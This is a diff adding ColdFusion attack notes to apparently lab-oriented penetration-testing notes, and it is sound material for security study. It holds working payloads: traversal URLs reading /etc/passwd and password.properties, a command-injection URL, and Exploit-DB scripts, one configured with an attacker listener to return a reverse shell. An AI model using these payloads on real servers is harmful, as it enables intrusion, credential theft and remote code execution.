@@ -891,5 +891,89 @@ Tools:
 ### Server Side Attacks
 Server-side attacks in thick client applications are similar to web application attacks. We should pay attention to the most common ones including most of the OWASP Top Ten.
 
+# ColdFusion
+## Discovery & Enumeration
+- ColdFusion exposes these ports by default: 80, 443 and 1935, 25, 8500, 5500 could be also visible.
+- ColdFusion pages typically use ".cfm" or ".cfc" file extensions.
+- ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion".
+- The error messages may contain references to ColdFusion-specific tags or functions.
+- ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm".
 
+```
+nmap -p- -sC -Pn 10.129.247.30 --open
+```
+## Attacks
+```
+searchsploit adobe coldfusion
+```
+### Directory Traversal
+The attack can be executed by manipulating the input parameters in ColdFusion tags such as `CFFile` and `CFDIRECTORY`.
+```
+http://example.com/index.cfm?directory=../../../etc/&file=passwd
+```
+ColdFusion files that are vulnerable to a directory traversal attack in Adobe ColdFusion 9.0.1 and earlier versions:
+- CFIDE/administrator/settings/mappings.cfm
+- logging/settings.cfm
+- datasources/index.cfm
+- j2eepackaging/editarchive.cfm
+- CFIDE/administrator/enter.cfm
+
+Remote attackers can exploit this vulnerability to read arbitrary files by manipulating the locale parameter in these specific ColdFusion files.
+
+E.g. manipulate this:
+```
+http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en
+```
+to this:
+```
+http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
+```
+
+Use `searchsploit`, copy the exploit to a working directory and then execute the file to see what arguments it requires:
+```
+searchsploit -p 14641
+```
+`-p` stands for "path" and 14641 is the Exploit-DB (EDB) entry ID.
+```
+cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
+```
+```
+python2 14641.py
+```
+The `password.properties` file in ColdFusion is a configuration file that securely stores encrypted passwords for various services and resources the ColdFusion server uses. These encrypted passwords are used for services like database connections, mail servers, LDAP servers, and other resources that require authentication.
+E.g.:
+```
+python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
+```
+### Unathenticated RCE
+```
+http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
+```
+This URL includes a semicolon (`%3B`) at the beginning of the query string, which can allow for the execution of multiple commands on the server.
+An example of a ColdFusion Unauthenticated RCE attack is the `CVE-2009-2265` vulnerability that affected Adobe ColdFusion versions 8.0.1 and earlier. This exploit allowed unauthenticated users to upload files and gain remote code execution on the target host. The vulnerability exists in the FCKeditor package, and is accessible on the following path: 
+```
+http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
+```
+
+CVE-2009-2265 is the vulnerability identified by our earlier searchsploit search as Adobe ColdFusion 8 - Remote Command Execution (RCE). 
+```
+searchsploit -p 50057
+```
+```
+cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
+```
+Set the correct information with `vim` and launch the exploit:
+```
+if __name__ == '__main__':
+    # Define some information
+    lhost = '10.10.14.55' # HTB VPN IP
+    lport = 4444 # A port not in use on localhost
+    rhost = "10.129.247.30" # Target IP
+    rport = 8500 # Target Port
+    filename = uuid.uuid4().hex
+```
+```
+python3 50057.py
+```
+The exploit will take a bit of time to launch, but it eventually will return a functional remote shell.
 
